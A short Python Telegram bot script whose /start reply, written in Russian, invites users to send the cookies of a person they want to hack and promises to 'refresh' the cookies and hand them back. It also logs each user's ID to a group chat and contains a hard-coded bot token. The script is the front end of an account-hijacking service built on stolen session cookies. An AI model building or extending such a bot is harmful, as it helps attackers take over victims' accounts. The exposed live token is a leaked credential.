import os
import telebot

TOKEN = "8260437183:AAG2NNbMPhsvkWjkxYaxAjceNm9jward6UA"
GROUP_ID = "-1003396901780"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_command(message):
    # Игнорируем сообщения из групп
    if message.chat.type != 'private':
        return
        
    bot.send_message(
        message.chat.id, 
        "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪"
    )
    try:
        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
    except Exception as e:
        print(f"Ошибка отправки в группу: {e}")

# Убираем обработчик для всех сообщений - бот будет игнорировать всё кроме /start

print("🚀 Бот запущен и готов к работе!")
bot.polling(none_stop=True)
